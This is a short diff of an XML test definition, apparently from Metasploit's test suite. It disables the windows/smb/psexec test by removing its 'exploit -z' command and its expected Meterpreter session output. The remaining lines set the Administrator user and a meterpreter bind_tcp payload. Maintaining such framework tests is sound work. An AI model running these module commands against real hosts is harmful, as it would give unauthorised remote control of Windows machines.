@@ -4,7 +4,7 @@
 		psexec
 	</name>
 	<description>
-		This test runs psexec on a vulnerable host.
+		This test sets up psexec on a vulnerable host. (doesn't run currently - bug)
 	</description>
 	<commands>
 		use windows/smb/psexec
@@ -13,13 +13,10 @@
 		set SMBUser Administrator
 		set SMBPass 
 		set payload windows/meterpreter/bind_tcp
-		exploit -z
 		exit
 	</commands>
 	<output>
 		<successes>
-			<success>Meterpreter session 1 opened</success>	
-			<success>Meterpreter session 1 closed.  Reason: User exit</success>
 		</successes>
 		<failures>
 		</failures>
